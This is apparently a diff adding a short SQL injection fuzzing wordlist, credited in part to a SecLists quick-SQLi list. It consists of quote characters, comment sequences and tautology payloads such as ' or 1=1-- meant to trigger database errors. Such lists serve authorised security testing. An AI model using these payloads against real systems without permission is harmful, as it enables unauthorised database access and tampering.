@@ -1,0 +1,43 @@
+# SQL Injection tests
+# Tries to cause database errors ( portions taken from /SecLists/Fuzzing/SQLi/quick-SQLi.txt )
+999999999999999999999999
+'
+--
+1
+a
+';--
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
